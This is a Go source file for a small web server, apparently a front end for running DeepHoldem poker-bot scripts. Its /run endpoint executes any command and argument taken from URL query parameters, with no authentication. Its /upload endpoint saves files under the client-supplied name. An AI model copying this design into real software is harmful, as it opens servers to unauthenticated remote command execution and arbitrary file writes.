package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
)

func decodeBase64(text string) []byte {
	dec, _ := base64.StdEncoding.DecodeString(text)

	return dec

}

func hello(w http.ResponseWriter, req *http.Request) {
	queries := req.URL.Query()
	command := queries.Get("command")
	args := queries.Get("args")

	fmt.Println(command, args)

	out, err := exec.Command(command, args).Output()

	if err != nil {
		w.Write([]byte(fmt.Sprintf("%s", err)))
		return
	}

	w.Write([]byte(fmt.Sprintf("%s\n%s", "Executed Successfully, Results: ", out)))
}

func html(w http.ResponseWriter, req *http.Request) {
	w.Write(decodeBase64(`PCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+IDx0aXRsZT5UaGluZ2FtYWplZWs8L3RpdGxlPiA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2RhaXN5dWkvMS4yNS40L2Z1bGwubWluLmNzcyIgaW50ZWdyaXR5PSJzaGE1MTItZkxkUFRzZHRBeE4rL3llektNWUZKV1RHVUVpRW5JRkhVN1BQdDBhL1ZoTE9VV1BoRnNXYVdzSTJjSmdGUS9rcFR3NUFwTUo4QzRadytiZXVRZHZGMlE9PSIgY3Jvc3NvcmlnaW49ImFub255bW91cyIgcmVmZXJyZXJwb2xpY3k9Im5vLXJlZmVycmVyIi8+IDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvdGFpbHdpbmRjc3MvMi4yLjE5L3RhaWx3aW5kLm1pbi5jc3MiIGludGVncml0eT0ic2hhNTEyLXduZWE5OXVLSUMzVEpGN3Y0ZUtrNFkrbE16Mk1rbHYxOCtyNG5hMkduMWFiRFJQUE9lZWY5NXhUemR3R0Q5ZTZ6WEpCdGVNSWhaMSs2OFFDNWJ5Slp3PT0iIGNyb3Nzb3JpZ2luPSJhbm9ueW1vdXMiIHJlZmVycmVycG9saWN5PSJuby1yZWZlcnJlciIvPiA8c3R5bGU+LmhvdmVyLWNsb3NlOmhvdmVye2NvbG9yOiByZ2IoMjU1LCAyNTUsIDI1NSk7IGN1cnNvcjogcG9pbnRlcjt9PC9zdHlsZT48L2hlYWQ+PGJvZHk+IDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+IDxoMiBjbGFzcz0iY2FyZC10aXRsZSI+R3VpZGU8L2gyPiA8dWwgY2xhc3M9InN0ZXBzIHN0ZXBzLXZlcnRpY2FsIj4gPGxpIGNsYXNzPSJzdGVwIj5VcGxvYWQgeW91ciBzY3JpcHRzIHVzaW5nIHRoZSB1cGxvYWQgYnV0dG9uLiBBIGd1aWRlIGZvciBwb3NzaWJsZSBzY3JpcHRzIGNhbiBiZSBmb3VuZCBhdCBodHRwczovL2dpdGh1Yi5jb20vaGFwcHlwZXBwZXIvRGVlcEhvbGRlbS90cmVlL21hc3Rlci9BQ1BDU2VydmVyPC9saT48bGkgY2xhc3M9InN0ZXAiPkluIGFsbCB5b3VyIHNjcmlwdHMgeW91IG5lZWQgdG8gYGNkYCBpbnRvIHRoZSBmb2xkZXIgd2hlcmUgRGVlcEhvbGRlbSBhbmQgc3Vic2VxdWVudGx5IEFDUENTZXJ2ZXIgYXJlIGxvY2F0ZWQuIFRoZXkgYXJlIHJpZ2h0IGhlcmUgaW4gdGhlIHJvb3Qgb2YgdGhlIHNlcnZlciBmaWxlIHNvIGp1c3QgZG8gYGNkIERlZXBIb2xkZW0vQUNQQ1NlcnZlciAmJiBbcmVzdF1gLjwvbGk+PGxpIGNsYXNzPSJzdGVwIj5SdW4geW91ciBzY3JpcHRzIHdpdGggYmFzaC4gSWYgeW91IHdhbnQgbWUgdG8gaW5zdGFsbCBhbm90aGVyIHRlcm1pbmFsIGNvbnRhY3QgbWUgYXQgQ2h1YmFrIzc0MDAuPC9saT48bGkgY2xhc3M9InN0ZXAiPkRvIGBsc2AgYXMgY29tbWFuZCBhbmQgYC1hYCBhcyBhcmd1bWVudCB0byB2aWV3IGFsbCB5b3VyIHNjcmlwdHMuPC9saT48L3VsPiA8L2Rpdj48ZGl2IGlkPSJhcHAiIGNsYXNzPSJncmlkIHctc2NyZWVuIGgtc2NyZWVuIGJnLWJhc2UtMzAwIHBsYWNlLWl0ZW1zLWNlbnRlciByb3VuZGVkLW1kIGhvdmVyOnJvdW5kZWQtbGciPiA8ZGl2IGNsYXNzPSJmbGV4IGZsZXgtY29sIHctMy80IGgtNTAgZ2FwLTMiPiA8ZGl2IGNsYXNzPSJmbGV4IGZsZXgtcm93Ij4gPGZvcm0gZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgYWN0aW9uPSIvdXBsb2FkIiBtZXRob2Q9InBvc3QiPiA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0ibXlGaWxlIi8+IDxpbnB1dCBjbGFzcz0iYnRuIGJ0bi1sZyIgdHlwZT0ic3VibWl0IiB2YWx1ZT0idXBsb2FkIi8+IDwvZm9ybT4gPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAgdy0yLzQiPiA8c3Bhbj5Db21tYW5kPC9zcGFuPiA8dGV4dGFyZWEgdi1tb2RlbD0iY29tbWFuZCIgY2xhc3M9InRleHRhcmVhIHRleHRhcmVhLWVycm9yIHctZnVsbCIgcGxhY2Vob2xkZXI9IkNvbW1hbmQiPjwvdGV4dGFyZWE+IDwvZGl2PjxkaXYgY2xhc3M9ImlucHV0LWdyb3VwIHctMi80Ij4gPHNwYW4+QXJnczwvc3Bhbj4gPHRleHRhcmVhIHYtbW9kZWw9ImFyZ3MiIGNsYXNzPSJ0ZXh0YXJlYSB0ZXh0YXJlYS1lcnJvciB3LWZ1bGwiIHBsYWNlaG9sZGVyPSJBcmdzIj48L3RleHRhcmVhPiA8L2Rpdj48L2Rpdj48YnV0dG9uIEBjbGljaz0icnVuIiBjbGFzcz0iYnRuIGJ0bi1sZyI+UnVuPC9idXR0b24+IDxkaXYgY2xhc3M9Im1vY2t1cC1jb2RlIj4gPHByZT48Y29kZT57eyByZXN1bHQgfX08L2NvZGU+PC9wcmU+IDwvZGl2PjwvZGl2PjwvZGl2PjxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL3Z1ZUAyLjYuMTQvZGlzdC92dWUuanMiPjwvc2NyaXB0PiA8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+bGV0IHZ1ZT1uZXcgVnVlKHtlbDogIiNhcHAiLCBkYXRhKCl7cmV0dXJue2FyZ3M6ICJtYXRjaE5hbWUgaG9sZGVtLmxpbWl0LjJwLnJldmVyc2VfYmxpbmRzLmdhbWUgMTAwMCAwIEFsaWNlIC4vZXhhbXBsZV9wbGF5ZXIubGltaXQuMnAuc2ggQm9iIC4vZXhhbXBsZV9wbGF5ZXIubGltaXQuMnAuc2giLCByZXN1bHQ6ICJSZXN1bHQgd2lsbCBzaG93IHVwIGhlcmUuLi4iLCBjb21tYW5kOiAiY2Qgfi9EZWVwSG9sZGVtL0FDUENTZXJ2ZXIgJiYgLi9wbGF5X21hdGNoLnBsIn19LCBjcmVhdGVkOiBmdW5jdGlvbigpe30sIG1vdW50ZWQoKXt9LCBjb21wdXRlZDp7fSwgd2F0Y2g6e30sIG1ldGhvZHM6e3J1bjogYXN5bmMgKCk9Pntjb25zdCBjb21tRW5jPWVuY29kZVVSSUNvbXBvbmVudCh2dWUuY29tbWFuZCk7IGNvbnN0IGFyZ0VuYz1lbmNvZGVVUklDb21wb25lbnQodnVlLmFyZ3MpOyBjb25zdCByZXRUZXh0PWF3YWl0IChhd2FpdCBmZXRjaCggYC9ydW4/Y29tbWFuZD0ke2NvbW1FbmN9JmFyZ3M9JHthcmdFbmN9YCApKS50ZXh0KCk7IHZ1ZS5yZXN1bHQ9cmV0VGV4dDt9fX0pIDwvc2NyaXB0PjwvYm9keT48L2h0bWw+`))
}

func uploadFile(w http.ResponseWriter, r *http.Request) {
	fmt.Println("File Upload Endpoint Hit")

	// Parse our multipart form, 10 << 20 specifies a maximum
	// upload of 10 MB files.
	r.ParseMultipartForm(10 << 20)
	// FormFile returns the first file for the given key `myFile`
	// it also returns the FileHeader so we can get the Filename,
	// the Header and the size of the file
	file, handler, err := r.FormFile("myFile")
	if err != nil {
		fmt.Println("Error Retrieving the File")
		fmt.Println(err)
		return
	}
	defer file.Close()
	fmt.Printf("Uploaded File: %+v\n", handler.Filename)
	fmt.Printf("File Size: %+v\n", handler.Size)
	fmt.Printf("MIME Header: %+v\n", handler.Header)

	// read all of the contents of our uploaded file into a
	// byte array
	fileBytes, err := ioutil.ReadAll(file)
	if err != nil {
		fmt.Println(err)
	}
	// write this byte array to our temporary file
	ioutil.WriteFile(handler.Filename, fileBytes, 0644)
	// return that we have successfully uploaded our file!
	fmt.Fprintf(w, "Successfully Uploaded File\n")
}

func main() {

	http.HandleFunc("/run", hello)
	http.HandleFunc("/", html)
	http.HandleFunc("/upload", uploadFile)
	fmt.Println("Serving... on port 8090")
	http.ListenAndServe(":8090", nil)
}
